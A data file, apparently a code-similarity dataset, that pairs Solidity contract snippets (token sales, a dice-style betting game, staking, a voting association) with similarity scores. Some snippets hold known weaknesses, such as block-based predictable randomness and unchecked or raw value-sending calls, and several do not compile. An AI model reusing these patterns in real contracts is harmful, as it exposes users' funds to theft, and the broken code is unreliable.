        uint randnum = uint(keccak256(abi.encodePacked(now,msg.sender,_name,blockhash(block.number-1),block.difficulty))) % 100; 
        uint winchance = _undernumber;

        if(_undernumber > randnum){
            betresult = ""win!"";
        } else {
            betresult = ""lose!"";
        }

        if(keccak256(abi.encodePacked(betresult)) == keccak256(abi.encodePacked(""win!""))) {
            winmoney = msg.value + ((msg.value * 100 / winchance) - msg.value) * 24 / 25 ;
            ownerget = ((msg.value * 100 / winchance) - msg.value) * 1 / 25 ;
            msg.sender.transfer(winmoney);
            owner.transfer(ownerget);
        } else {
            winmoney = 0;
            ownerget = 0;
        }

        resultt[msg.sender] = betresult;
        randnumber[msg.sender] =  randnum;
        winmoneyy[msg.sender] = winmoney;

    }

    function withdraw() external onlyOwner {
        owner.transfer(this.balance);
    }
    function winorlose() external view returns(string) {
        return resultt[msg.sender];
    }
    function showtheend() external view returns(uint, uint) {
        return (randnumber[msg.sender],winmoneyy[msg.sender]);
    }

}",0.5623040872003552,"contract TRNCoin is StandardToken { 

    

    
    string public name;                   
    uint8 public decimals;                
    string public symbol;                 
    string public version = &#39;H1.0&#39;; 
    uint256 public unitsOneEthCanBuy;     
    uint256 public totalEthInWei;         
    address public fundsWallet;           
    uint256 public startTime; 
    
    
    
    function TRNCoin() {
        balances[msg.sender] = 10000000000000000000000000000;               
        totalSupply = 10000000000000000000000000000;                        
        name = ""TRN"";                                   
        decimals = 18;                                               
        symbol = ""TRN"";                                             
        unitsOneEthCanBuy = 100000;                                      
        fundsWallet = msg.sender; 
        startTime = now  ;
        
        
    }

    function() payable{
        totalEthInWei = totalEthInWei + msg.value;
        
        if (now< startTime + 1 weeks ){
            unitsOneEthCanBuy = 140000; 
            
        }else if(now > startTime +1 weeks && now < startTime+10 weeks){
            unitsOneEthCanBuy = 120000; 
        }else{
            
            return;
        }
        
        
        
        uint256 amount = msg.value * unitsOneEthCanBuy;
        if (balances[fundsWallet] < amount) {
            return;
        }

        balances[fundsWallet] = balances[fundsWallet] - amount;
        balances[msg.sender] = balances[msg.sender] + amount;

        Transfer(fundsWallet, msg.sender, amount); 

        
        fundsWallet.transfer(msg.value);                               
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);

        
        
        
        if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }
        return true;
    }
}"
"contract TransManager {
        uint transCounter;

        struct MetaData{
            uint id;
            address owner;
            string docType;
            string fileHash;
        }

        mapping (address => MetaData[])  fileLogs;

        function regTransaction(string _docType, string _fileHash) public {
            transCounter++;
            MetaData memory fileLog = MetaData(transCounter, msg.sender, _docType, _fileHash );

            fileLogs[msg.sender].push(fileLog);
        }

        function getTransactions() public view returns (uint[]) {
            MetaData[] storage temp = fileLogs[msg.sender];

            uint[] memory ids = new uint[](transCounter);

            for (uint i = 0; i < transCounter; i++){
                ids[i]=temp[i].id;
            }

            return ids;
        }
    }",0.5794475322343076,"contract TokenBase
{
    string public name;
    string public symbol;
    uint8 public decimals;
    
	uint256 internal currentSupply;

	mapping(address => uint) public balanceOf;
	event Transfer(address indexed from, address indexed to, uint256 value);
	
	function totalSupply() constant returns (uint256)
	{
	    return currentSupply;
	}
	
	function transfer(address to, uint amount) returns (bool)
	{
		if (balanceOf[msg.sender] < amount) throw;           
		if (balanceOf[to] + amount < balanceOf[to]) throw;
		
		balanceOf[msg.sender] -= amount;
		balanceOf[to] += amount;
		Transfer(msg.sender, to, amount);
		return true;
	}
}"
"contract B {
  function xyz(string _a) {
  A a = A(contact address); 
  a.abc(_a); 
  }
}",0.5948700005979095,"contract Contract {function XBVHandler( address _from, uint256 _value );}"
"contract owned {
    address public owner;

    function owned() {
        owner = msg.sender;
    }
    
contract Association is owned, tokenRecipient {

    
    uint public minimumQuorum;
    uint public debatingPeriodInMinutes;
    Proposal[] public proposals;
    uint public numProposals;
    token public sharesTokenAddress;

    event ProposalAdded(uint proposalID, address recipient, uint amount, string description);
    event Voted(uint proposalID, bool position, address voter);
    event ProposalTallied(uint proposalID, uint result, uint quorum, bool active);
    event ChangeOfRules(uint minimumQuorum, uint debatingPeriodInMinutes, address sharesTokenAddress);

    struct Proposal {
        address recipient;
        uint amount;
        string description;
        uint votingDeadline;
        bool executed;
        bool proposalPassed;
        uint numberOfVotes;
        bytes32 proposalHash;
        Vote[] votes;
        mapping (address => bool) voted;
    }

    struct Vote {
        bool inSupport;
        address voter;
    }

    
    modifier onlyShareholders {
        if (sharesTokenAddress.balanceOf(msg.sender) == 0) throw;
        _;
    }

    
    function Association(token sharesAddress, uint minimumSharesToPassAVote, uint minutesForDebate) payable {
        changeVotingRules(sharesAddress, minimumSharesToPassAVote, minutesForDebate);
    }

    
    function changeVotingRules(token sharesAddress, uint minimumSharesToPassAVote, uint minutesForDebate) onlyOwner {
        sharesTokenAddress = token(sharesAddress);
        if (minimumSharesToPassAVote == 0 ) minimumSharesToPassAVote = 1;
        minimumQuorum = minimumSharesToPassAVote;
        debatingPeriodInMinutes = minutesForDebate;
        ChangeOfRules(minimumQuorum, debatingPeriodInMinutes, sharesTokenAddress);
    }

    
    function newProposal(
        address beneficiary,
        uint etherAmount,
        string JobDescription,
        bytes transactionBytecode
    )
        onlyShareholders
        returns (uint proposalID)
    {
        proposalID = proposals.length++;
        Proposal p = proposals[proposalID];
        p.recipient = beneficiary;
        p.amount = etherAmount;
        p.description = JobDescription;
        p.proposalHash = sha3(beneficiary, etherAmount, transactionBytecode);
        p.votingDeadline = now + debatingPeriodInMinutes * 1 minutes;
        p.executed = false;
        p.proposalPassed = false;
        p.numberOfVotes = 0;
        ProposalAdded(proposalID, beneficiary, etherAmount, JobDescription);
        numProposals = proposalID+1;

        return proposalID;
    }

    
    function checkProposalCode(
        uint proposalNumber,
        address beneficiary,
        uint etherAmount,
        bytes transactionBytecode
    )
        constant
        returns (bool codeChecksOut)
    {
        Proposal p = proposals[proposalNumber];
        return p.proposalHash == sha3(beneficiary, etherAmount, transactionBytecode);
    }

    
    function vote(uint proposalNumber, bool supportsProposal)
        onlyShareholders
        returns (uint voteID)
    {
        Proposal p = proposals[proposalNumber];
        if (p.voted[msg.sender] == true) throw;

        voteID = p.votes.length++;
        p.votes[voteID] = Vote({inSupport: supportsProposal, voter: msg.sender});
        p.voted[msg.sender] = true;
        p.numberOfVotes = voteID +1;
        Voted(proposalNumber,  supportsProposal, msg.sender); 
        return voteID;
    }

    function executeProposal(uint proposalNumber, bytes transactionBytecode) {
        Proposal p = proposals[proposalNumber];
        
        if (now < p.votingDeadline  
            ||  p.executed        
            ||  p.proposalHash != sha3(p.recipient, p.amount, transactionBytecode)) 
            throw;

        
        uint quorum = 0;
        uint yea = 0;
        uint nay = 0;

        for (uint i = 0; i <  p.votes.length; ++i) {
            Vote v = p.votes[i];
            uint voteWeight = sharesTokenAddress.balanceOf(v.voter);
            quorum += voteWeight;
            if (v.inSupport) {
                yea += voteWeight;
            } else {
                nay += voteWeight;
            }
        }

        
        if (quorum <= minimumQuorum) {
            
            throw;
        } else if (yea > nay ) {
            
            p.executed = true;
            if (!p.recipient.call.value(p.amount * 1 ether)(transactionBytecode)) {
                throw;
            }
            p.proposalPassed = true;
        } else {
            p.proposalPassed = false;
        }
        
        ProposalTallied(proposalNumber, yea - nay, quorum, p.proposalPassed);
    }
}
",0.5907335457687188,"contract PassManager is PassTokenManager {
    
    struct order {
        address buyer;
        uint weiGiven;
    }
    
    order[] public orders;
    
    uint numberOfOrders;

    
    mapping (uint => bool) orderCloned;
    
    function PassManager(
        PassDao _passDao,
        address _clonedFrom,
        string _tokenName,
        string _tokenSymbol,
        uint8 _tokenDecimals,
        bool _token,
        bool _transferable,
        uint _initialPriceMultiplier,
        uint _inflationRate) 
        PassTokenManager( _passDao, _clonedFrom, _tokenName, _tokenSymbol, _tokenDecimals, 
            _token, _transferable, _initialPriceMultiplier, _inflationRate) { }
    
    
    function () payable onlyShareManager { }
    
    
    
    
    
    function sendTo(
        address _recipient,
        uint _amount
    ) external onlyClient returns (bool) {

        if (_recipient.send(_amount)) return true;
        else return false;
    }

    
    
    
    
    
    
    function buyTokensFor(
        uint _proposalID,
        address _buyer, 
        uint _date,
        bool _presale) internal returns (bool) {

        if (_proposalID == 0 || !sale(_proposalID, _buyer, msg.value, _date, _presale)) throw;

        fundings[_proposalID].totalWeiGiven += msg.value;        
        if (fundings[_proposalID].totalWeiGiven == fundings[_proposalID].amountToFund) closeFunding(_proposalID);

        Given[_proposalID][_buyer].weiAmount += msg.value;
        
        return true;
    }
    
    
    
    
    
    function buyTokensForProposal(
        uint _proposalID, 
        address _buyer) payable returns (bool) {

        if (_buyer == 0) _buyer = msg.sender;

        if (fundings[_proposalID].moderator != 0) throw;

        return buyTokensFor(_proposalID, _buyer, now, true);
    }

    
    
    
    
    
    
    function buyTokenFromModerator(
        uint _proposalID,
        address _buyer, 
        uint _date,
        bool _presale) payable external returns (bool){

        if (msg.sender != fundings[_proposalID].moderator) throw;

        return buyTokensFor(_proposalID, _buyer, _date, _presale);
    }

    
    
    
    function addOrder(
        address _buyer, 
        uint _weiGiven) internal {

        uint i;
        numberOfOrders += 1;

        if (numberOfOrders > orders.length) i = orders.length++;
        else i = numberOfOrders - 1;
        
        orders[i].buyer = _buyer;
        orders[i].weiGiven = _weiGiven;
    }

    
    
    function removeOrder(uint _order) internal {
        
        if (numberOfOrders - 1 < _order) return;

        numberOfOrders -= 1;
        if (numberOfOrders > 0) {
            for (uint i = _order; i <= numberOfOrders - 1; i++) {
                orders[i].buyer = orders[i+1].buyer;
                orders[i].weiGiven = orders[i+1].weiGiven;
            }
        }
        orders[numberOfOrders].buyer = 0;
        orders[numberOfOrders].weiGiven = 0;
    }
    
    
    
    function buyTokens() payable returns (bool) {

        if (!transferable || msg.value < 100 finney) throw;
        
        addOrder(msg.sender, msg.value);
        
        return true;
    }
    
    
    
    
    
    
    function sellTokens(
        uint _tokenAmount,
        uint _from,
        uint _to) returns (uint) {

        if (!transferable 
            || uint(balances[msg.sender]) < _amount 
            || numberOfOrders == 0) throw;
        
        if (_to == 0 || _to > numberOfOrders - 1) _to = numberOfOrders - 1;
        
        
        uint _tokenAmounto;
        uint _amount;
        uint _totalAmount;
        uint o = _from;

        for (uint i = _from; i <= _to; i++) {

            if (_tokenAmount > 0 && orders[o].buyer != msg.sender) {

                _tokenAmounto = TokenAmount(orders[o].weiGiven, priceMultiplier(0), actualPriceDivisor(0));

                if (_tokenAmount >= _tokenAmounto 
                    && transferFromTo(msg.sender, orders[o].buyer, _tokenAmounto)) {
                            
                    _tokenAmount -= _tokenAmounto;
                    _totalAmount += orders[o].weiGiven;
                    removeOrder(o);
                }
                else if (_tokenAmount < _tokenAmounto
                    && transferFromTo(msg.sender, orders[o].buyer, _tokenAmount)) {
                        
                    _amount = weiAmount(_tokenAmount, priceMultiplier(0), actualPriceDivisor(0));
                    orders[o].weiGiven -= _amount;
                    _totalAmount += _amount;
                    i = _to + 1;
                }
                else o += 1;
            } 
            else o += 1;
        }
        
        if (!msg.sender.send(_totalAmount)) throw;
        else return _totalAmount;
    }    

    
    
    
    
    function removeOrders(
        uint _from,
        uint _to) returns (bool) {

        if (_to == 0 || _to > numberOfOrders) _to = numberOfOrders -1;
        
        uint _totalAmount;
        uint o = _from;

        for (uint i = _from; i <= _to; i++) {

            if (orders[o].buyer == msg.sender) {
                
                _totalAmount += orders[o].weiGiven;
                removeOrder(o);

            } else o += 1;
        }

        if (!msg.sender.send(_totalAmount)) throw;
        else return true;
    }
    
}"
"contract hoteltranscation  {

  struct hotel{
    string HotelName;
    uint256 BookingNumber;
  }

   function HotelBooking(string _HotelName,uint256 _BookingNumber ) public   {
     hotel storage addtrascation =  hotel (_HotelName,_BookingNumber);
   }
}",0.5178340500614541,"contract ERC20TokensContract {

    

    function balanceOf(address _owner) external view returns (uint256 balance);

    function totalSupply() external view returns (uint256);

    string public name;

    string public symbol;

}"
"contract TipFaucet {

    modifier isDev { if (msg.sender != 

    function withdraw() isDev {
        msg.sender.send(this.balance);
    }
}",0.5970068135650789,"contract Owned {

    
    address owner;

    
    function Owned() {
        owner = msg.sender;
    }

    

    
    modifier onlyowner() {
        if (msg.sender==owner) _;
    }
}"
"contract Product{ 
  struct ProductStruct {  
    bytes32 name;  
    bool status;  
  }  
  mapping(uint => ProductStruct) public productStructs;

  function updateProduct(bytes32 name, uint ID) returns(bool success) {
    productStructs[ID].name = name;
    productStructs[ID].status = true;
    return true;
  }
}",0.5440825106624761,"contract IMarketplace1 is IMarketplace{
    function getProduct(bytes32 id) public view returns (string memory name, address owner, address beneficiary, uint pricePerSecond, Currency currency, uint minimumSubscriptionSeconds, ProductState state) {}
}"
"contract ContractFactory {
  address[] public contracts;

  function ContractFactory() {
  }
  function getContractCount() public constant returns(unit contractCount) {
    return contracts.length;
  }

  function newContract(unit _rent, unit _security_deposit, string _house, address _owner, address _tenant)
  public returns(address newContract) {
    Rental c = new Rental(_rent, _security_deposit, _house, _owner, _tenant);
    contracts.push(c);
    return c;
  }
}",0.5961946835271466,"contract Data {
    function canMakeNoFeeTransfer(address _from, address _to) constant public returns(bool);
    function getNetworkFee() public constant returns (uint256);
    function getBlocksquareFee() public constant returns (uint256);
    function getCPFee() public constant returns (uint256);
    function getFirstBuyersFee() public constant returns (uint256);
    function hasPrestige(address _owner) public constant returns(bool);
}"
"contract ConvertStringToUint {       

function stringToUint(string _number) public pure returns(uint) {

    bytes memory strBytes = bytes(_number);

    uint i;
    uint digit;
    uint result;

    for (i = 0; i < strBytes.length; i++) {

        if (strBytes[i] == byte(48))        { 
            digit = 0;
        } else if (strBytes[i] == byte(49)) {
            digit = 1;
        } else if (strBytes[i] == byte(50)) {
            digit = 2;
        } else if (strBytes[i] == byte(51)) {
            digit = 3;
        } else if (strBytes[i] == byte(52)) {
            digit = 4;    
        } else if (strBytes[i] == byte(53)) {
            digit = 5;
        } else if (strBytes[i] == byte(54)) {
            digit = 6;
        } else if (strBytes[i] == byte(55)) {
            digit = 7;
        } else if (strBytes[i] == byte(56)) {
            digit = 8;    
        } else if (strBytes[i] == byte(57)) {
            digit = 9;
        } else {
            revert();
        }

        result = result * 10 + digit;

    }
        return result;
}

}",0.5615136954655477,"contract DSParser{
    uint8 constant WAD_Dec=18;
    uint128 constant WAD = 10 ** 18;
    function parseInt128(string _a)  constant  returns (uint128) { 
		return cast(parseInt( _a, WAD_Dec));
    }
    function cast(uint256 x) constant internal returns (uint128 z) {
        assert((z = uint128(x)) == x);
    }
    function parseInt(string _a, uint _b)  
			constant 
			returns (uint) { 
		
			bytes memory bresult = bytes(_a);
            uint mint = 0;
            bool decimals = false;
            for (uint i=0; i<bresult.length; i++){
                if ((bresult[i] >= 48)&&(bresult[i] <= 57)){
                    if (decimals){
                       if (_b == 0){
                        
                        if(uint(bresult[i])- 48>4){
                            mint = mint+1;
                        }    
                        break;
                       }
                       else _b--;
                    }
                    mint *= 10;
                    mint += uint(bresult[i]) - 48;
                } else if (bresult[i] == 46||bresult[i] == 44) { 
                    decimals = true;
                }
            }
            if (_b > 0) mint *= 10**_b;
           return mint;
    }
	
}"
"contract Hello {
    string public message;

    constructor (string memory initialMessage) public {
        message = initialMessage;
    }

    function setMessage(string memory newMessage) public {
        message = newMessage;
    }

}",0.5943712792789062,"contract SimpleStorage {

    string public welcomeMsg = ""Hello block chain from InfPro IT Solutions!"";

    string[] public myStorage;

    

    function add(string _store) public {

        myStorage.push(_store);

    }

}"
"contract Test {

function send() payable public {
    address payable recipient = 0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C;
    recipient.transfer(1000000000000000000); 
}",0.5510000890057617,"contract mile{

     function receiveEther() payable public{
     }

     function sendEther(address _address) payable public{
         uint value = 0;

         _address.transfer(value);
     }

}"
"contract ClientSC is Owned {
  using sharedLib for sharedLib.Contribution;
  using sharedLib for sharedLib.Reward; 
  using sharedLib for sharedLib.Client;
  using sharedLib for sharedLib.Projet;

  sharedLib.Client Client; 

  address public Crowdfactory;

  uint projectsNB;
  uint contributionsNB;

  mapping (uint=> sharedLib.Projet) myProjects;
  mapping (uint => sharedLib.Contribution)  myContributions; 
  mapping (uint=> sharedLib.Reward) myRewards;

  

  

  
  constructor (uint _userId,string memory _mail ,string memory _password ) public {
    
    

    Client = sharedLib.Client({
      userId:_userId,
      mail :_mail, 
      password:_password, 
      contractAddress: address (this), 
      publickey:msg.sender 
    });

    projectsNB=0;
    contributionsNB=0;
    Crowdfactory = msg.sender;
  }

  
  function getMyInfo () public returns (uint, string memory  , string memory, address, address,uint,uint,address) {
    return(Client.userId,
      Client.mail,
      Client.password,
      Client.contractAddress,
      Client.publickey,
      projectsNB,
      contributionsNB,
      Crowdfactory);
  }

  function getMyRewardsByContributionId(uint _id )public returns(string memory, uint){
    sharedLib.Reward memory r = myRewards[_id];
    return(r.rewardTitle, r.rewardValue );
  }

  function getMyContributionById(uint _id) public returns(string memory , uint,string memory ,uint, address, address){
    sharedLib.Contribution memory c= myContributions[_id];
    string memory rewardTitle ;
    uint  rewardValue;
    (rewardTitle, rewardValue) = getMyRewardsByContributionId( _id );
    return(c.ammount, c.tokenValue,rewardTitle, rewardValue,c.porteur,c.projet );
  }
}",0.5450121253439674,"contract SharpeCrowdsale is TokenSale {

    uint256 public totalEtherPaid = 0;
    uint256 public minContributionInWei;
    address public saleAddress;
    
    DynamicCeiling public dynamicCeiling;

    modifier amountValidated() {
        require(msg.value >= minContributionInWei);
        _;
    }

    
    
    
    
    
    
    function SharpeCrowdsale( 
        address _etherEscrowAddress,
        address _bountyAddress,
        address _trusteeAddress,
        address _affiliateUtilityAddress,
        address _apiAddress,
        uint256 _minContributionInWei) 
        TokenSale (
        _etherEscrowAddress,
        _bountyAddress,
        _trusteeAddress,
        _affiliateUtilityAddress,
        _apiAddress) 
    {
        minContributionInWei = _minContributionInWei;
        saleAddress = address(this);
    }

    function setDynamicCeilingAddress(address _dynamicCeilingAddress) public onlyOwner {
        dynamicCeiling = DynamicCeiling(_dynamicCeilingAddress);
    }

    function () 
        public 
        payable
        notPaused
        notClosed
        isValidated 
        amountValidated
        isApproved
    {
        uint256 contribution = msg.value;
        uint256 remaining = dynamicCeiling.availableAmountToCollect(totalEtherPaid);
        uint256 refund = 0;

        if (remaining == 0) {
            revert();
        }

        if (contribution > remaining) {
            contribution = remaining;
            refund = msg.value.sub(contribution);
        }
        doBuy(msg.sender, contribution);
        if (refund > 0) {
            msg.sender.transfer(refund);
        }
    }

    
    
    
    function applyDiscount(uint256 _etherAmount, uint256 _contributorTokens) internal constant returns (uint256) {
        return _contributorTokens;
    }

    
    
    function updateCounters(uint256 _etherAmount) internal {
        totalEtherPaid = totalEtherPaid.add(_etherAmount);
    }

    
    function closeSale() public onlyOwner {
        closed = true;
        SaleClosed(now);
    }
}"
"contract Staking {
    using SafeMath for uint;

    event StartStaking(address addr, uint value, uint amount, uint time);
    event WithdrawStake(address staker, uint amount);
    event Claim(address staker, uint reward);
    event DonationDeposited(address _address, uint value);

    struct Staker
    {
        uint amount;
        uint time;
    }


    uint public LastBlock = block.number;
    uint public Timestamp = now;

    uint public TotalStakingWeight;
    uint public TotalStakingAmount;
    uint public StakingRewardPool;
    bool public CS_frozen;
    uint public staking_threshold = 0 ether;
    address public Treasury       = 0xD0eDff4E0b7e7e410F631669B040905267E9FFD1;

    uint public round_interval   = 27 days;
    uint public max_delay        = 365 * 2 days;
    uint public DateStartStaking = 1541980800;

    mapping(address => Staker) public staker;

    function freeze(bool _f) public only_treasurer
    {
        CS_frozen = _f;
    }

    function withdraw_rewards () public only_treasurer
    {
        if (CS_frozen)
        {
            StakingRewardPool = address(this).balance.sub(TotalStakingAmount);
            Treasury.transfer(StakingRewardPool);
        }
    }

    function clear_treasurer () public only_treasurer
    {
        require(block.number > 1800000 && !CS_frozen);
        Treasury = 0x00;
    }

    function() public payable
    {
        start_staking();
    }

    function new_block() public
    {
        if (block.number > LastBlock)
        {
            uint _LastBlock = LastBlock;
            LastBlock = block.number;

            StakingRewardPool = address(this).balance.sub(TotalStakingAmount + msg.value);

            if (now > Timestamp)
            {
                uint _blocks = block.number - _LastBlock;
                uint _seconds = now - Timestamp;
                if (_seconds > _blocks * 25)
                {
                    _seconds = _blocks * 25;
                }
                TotalStakingWeight += _seconds.mul(TotalStakingAmount);
                Timestamp += _seconds;
            }
        }
    }

    function start_staking() public staking_available payable
    {
        assert(msg.value >= staking_threshold);
        new_block();

        if (staker[msg.sender].amount > 0)
        {
            if (Timestamp >= staker[msg.sender].time + round_interval)
            { 
                claim(); 
            }
            TotalStakingWeight = TotalStakingWeight.sub((Timestamp.sub(staker[msg.sender].time)).mul(staker[msg.sender].amount));
        }

        TotalStakingAmount = TotalStakingAmount.add(msg.value);
        staker[msg.sender].time = Timestamp;
        staker[msg.sender].amount = staker[msg.sender].amount.add(msg.value);

        emit StartStaking(
            msg.sender,
            msg.value,
            staker[msg.sender].amount,
            staker[msg.sender].time
        );
    }

    function DEBUG_donation() public payable {
        emit DonationDeposited(msg.sender, msg.value);
    }

    function withdraw_stake() public only_staker
    {
        new_block();
        require(Timestamp >= staker[msg.sender].time + round_interval);

        uint _amount = staker[msg.sender].amount;
        claim(); 
        TotalStakingAmount = TotalStakingAmount.sub(_amount);
        TotalStakingWeight = TotalStakingWeight.sub((Timestamp.sub(staker[msg.sender].time)).mul(staker[msg.sender].amount));

        staker[msg.sender].amount = 0;
        msg.sender.transfer(_amount);
        emit WithdrawStake(msg.sender, _amount);
    }

    function claim() public only_staker
    {
        if (CS_frozen) return;

        new_block();
        uint _StakingInterval = Timestamp.sub(staker[msg.sender].time);
        if (_StakingInterval >= round_interval)
        {
            uint _CompleteRoundsInterval = (_StakingInterval / round_interval).mul(round_interval);
            uint _StakerWeight = _CompleteRoundsInterval.mul(staker[msg.sender].amount);
            uint _reward = StakingRewardPool.mul(_StakerWeight).div(TotalStakingWeight);

            StakingRewardPool = StakingRewardPool.sub(_reward);
            TotalStakingWeight = TotalStakingWeight.sub(_StakerWeight);

            staker[msg.sender].time = staker[msg.sender].time.add(_CompleteRoundsInterval);

            msg.sender.transfer(_reward);
            emit Claim(msg.sender, _reward);
        }
    }

    function stake_reward(address _addr) public constant returns (uint)
    {
        require(staker[_addr].amount > 0);
        require(!CS_frozen);

        uint _blocks = block.number - LastBlock;
        uint _seconds = now - Timestamp;
        if (_seconds > _blocks * 25)
        {
            _seconds = _blocks * 25;
        }
        uint _Timestamp = Timestamp + _seconds;
        uint _TotalStakingWeight = TotalStakingWeight + _seconds.mul(TotalStakingAmount);
        uint _StakingInterval = _Timestamp.sub(staker[_addr].time);

        uint _CompleteRoundsInterval = (_StakingInterval / round_interval).mul(round_interval);
        uint _StakerWeight = _CompleteRoundsInterval.mul(staker[_addr].amount);
        uint _StakingRewardPool = address(this).balance.sub(TotalStakingAmount);
        return _StakingRewardPool.mul(_StakerWeight).div(_TotalStakingWeight);
    }

    modifier only_staker
    {
        require(staker[msg.sender].amount > 0);
        _;
    }

    modifier staking_available
    {
        require(now >= DateStartStaking && !CS_frozen);
        _;
    }

    modifier only_treasurer
    {
        require(msg.sender == Treasury);
        _;
    }

    function report_abuse(address _addr) public only_staker
    {
        require(staker[_addr].amount > 0);
        new_block();
        require(Timestamp > staker[_addr].time.add(max_delay));

        uint _amount = staker[_addr].amount;

        TotalStakingAmount = TotalStakingAmount.sub(_amount);
        TotalStakingWeight = TotalStakingWeight.sub((Timestamp.sub(staker[_addr].time)).mul(_amount));

        staker[_addr].amount = 0;
        _addr.transfer(_amount);
    }
}",0.5752030621225771,"contract CccTokenIco is StandardToken {
    using SafeMath for uint256;
    string public name = ""Crypto Credit Card Token"";
    string public symbol = ""CCCR"";
    uint8 public constant decimals = 6;
    
    uint256 public cntMembers = 0;
    uint256 public totalSupply = 200000000 * (uint256(10) ** decimals);
    uint256 public totalRaised;

    uint256 public startTimestamp;
    uint256 public durationSeconds = uint256(86400 * 7 * 11);

    uint256 public minCap = 3000000 * (uint256(10) ** decimals);
    uint256 public maxCap = 200000000 * (uint256(10) ** decimals);
    
    uint256 public avgRate = uint256(uint256(10)**(18-decimals)).div(460);

    address public stuff = 0x0CcCb9bAAdD61F9e0ab25bD782765013817821bD;
    address public teama = 0xfc6851324e2901b3ea6170a90Cc43BFe667D617A;
    address public teamb = 0x21f0F5E81BEF4dc696C6BF0196c60a1aC797f953;
    address public teamc = 0xE8726942a46E6C6B3C1F061c14a15c0053A97B6b;
    address public founder = 0xbb2efFab932a4c2f77Fc1617C1a563738D71B0a7;
    address public baseowner;

    event LogTransfer(address sender, address to, uint amount);
    event Clearing(address to, uint256 amount);

    function CccTokenIco(
    ) 
    {
        cntMembers = 0;
        startTimestamp = now - 14 days;
        baseowner = msg.sender;
        balances[baseowner] = totalSupply;
        Transfer(0x0, baseowner, totalSupply);
    }

    function bva(address partner, uint256 value, uint256 rate, address adviser) isIcoOpen payable public 
    {
      uint256 tokenAmount = calculateTokenAmount(value);
      if(msg.value != 0)
      {
        tokenAmount = calculateTokenCount(msg.value,avgRate);
      }else
      {
        require(msg.sender == stuff);
        avgRate = avgRate.add(rate).div(2);
      }
      if(msg.value != 0)
      {
        Clearing(teama, msg.value.mul(7).div(100));
        teama.transfer(msg.value.mul(7).div(100));
        Clearing(teamb, msg.value.mul(12).div(1000));
        teamb.transfer(msg.value.mul(12).div(1000));
        Clearing(teamc, msg.value.mul(9).div(1000));
        teamc.transfer(msg.value.mul(9).div(1000));
        Clearing(stuff, msg.value.mul(9).div(1000));
        stuff.transfer(msg.value.mul(9).div(1000));
        Clearing(founder, msg.value.mul(70).div(100));
        founder.transfer(msg.value.mul(70).div(100));
        if(partner != adviser)
        {
          Clearing(adviser, msg.value.mul(20).div(100));
          adviser.transfer(msg.value.mul(20).div(100));
        }else
        {
          Clearing(founder, msg.value.mul(20).div(100));
          founder.transfer(msg.value.mul(20).div(100));
        } 
      }
      totalRaised = totalRaised.add(tokenAmount);
      balances[baseowner] = balances[baseowner].sub(tokenAmount);
      balances[partner] = balances[partner].add(tokenAmount);
      Transfer(baseowner, partner, tokenAmount);
      cntMembers = cntMembers.add(1);
    }
    
    function() isIcoOpen payable public
    {
      if(msg.value != 0)
      {
        uint256 tokenAmount = calculateTokenCount(msg.value,avgRate);
        Clearing(teama, msg.value.mul(7).div(100));
        teama.transfer(msg.value.mul(7).div(100));
        Clearing(teamb, msg.value.mul(12).div(1000));
        teamb.transfer(msg.value.mul(12).div(1000));
        Clearing(teamc, msg.value.mul(9).div(1000));
        teamc.transfer(msg.value.mul(9).div(1000));
        Clearing(stuff, msg.value.mul(9).div(1000));
        stuff.transfer(msg.value.mul(9).div(1000));
        Clearing(founder, msg.value.mul(90).div(100));
        founder.transfer(msg.value.mul(90).div(100));
        totalRaised = totalRaised.add(tokenAmount);
        balances[baseowner] = balances[baseowner].sub(tokenAmount);
        balances[msg.sender] = balances[msg.sender].add(tokenAmount);
        Transfer(baseowner, msg.sender, tokenAmount);
        cntMembers = cntMembers.add(1);
      }
    }

    function calculateTokenAmount(uint256 count) constant returns(uint256) 
    {
        uint256 icoDeflator = getIcoDeflator();
        return count.mul(icoDeflator).div(100);
    }

    function calculateTokenCount(uint256 weiAmount, uint256 rate) constant returns(uint256) 
    {
        if(rate==0)revert();
        uint256 icoDeflator = getIcoDeflator();
        return weiAmount.div(rate).mul(icoDeflator).div(100);
    }

    function getIcoDeflator() constant returns (uint256)
    {
        if (now <= startTimestamp + 15 days) 
        {
            return 138;
        }else if (now <= startTimestamp + 29 days) 
        {
            return 123;
        }else if (now <= startTimestamp + 43 days) 
        {
            return 115;
        }else 
        {
            return 109;
        }
    }

    function finalize(uint256 weiAmount) isIcoFinished isStuff payable public
    {
      if(msg.sender == founder)
      {
        founder.transfer(weiAmount);
      }
    }

    function transfer(address _to, uint _value) isIcoFinished returns (bool) 
    {
        return super.transfer(_to, _value);
    }

    function transferFrom(address _from, address _to, uint _value) isIcoFinished returns (bool) 
    {
        return super.transferFrom(_from, _to, _value);
    }

    modifier isStuff() 
    {
        require(msg.sender == stuff || msg.sender == founder);
        _;
    }

    modifier isIcoOpen() 
    {
        require(now >= startTimestamp);
        require(now <= startTimestamp + 14 days || now >= startTimestamp + 19 days);
        require(now <= (startTimestamp + durationSeconds) || totalRaised < minCap);
        require(totalRaised <= maxCap);
        _;
    }

    modifier isIcoFinished() 
    {
        require(now >= startTimestamp);
        require(totalRaised >= maxCap || (now >= (startTimestamp + durationSeconds) && totalRaised >= minCap));
        _;
    }

}"
"contract B {
    function delegateIncrement(uint add) {
        A(addressA).increment(add) ; 
    }
}",0.5632341759038898,"contract token {
    function transfer(
        address receiver,
        uint amount
    );
}"
"contract MyContract {

  struct Person {
    uint age;
    uint size;
  }

  
  Person[] persons;

  event PersonAdded(uint indexed id, uint age, uint size);

  function addPerson(uint _age, uint _size) public {
    Person memory person = Person(_age, _size);
    id = persons.push(person) - 1;

    emit PersonAdded(id, _age, _size)
  }

  function removePerson(uint _id) public {
    
    

    delete persons[_id]
  }
}",0.5359987720131096,"contract ERC223Interface {

  uint public totalSupply;

  function balanceOf(address who) public constant returns (uint);

  function transfer(address to, uint tokens) public returns (bool success);

  function transfer(address to, uint value, bytes data) public;

  event Transfer(address indexed from, address indexed to, uint value, bytes data);

}"
"contract FixedInvalidOpcode {

    enum Dir {UP, LEFT, DOWN, RIGHT}
    Dir public currentDir;

    function changeDir(uint8 newDir) public {
        require(newDir <= uint8(Dir.RIGHT), ""Out of range"");
        currentDir = Dir(newDir);
    } 

}",0.5019077938343349,"contract Ownable {

  address public owner;

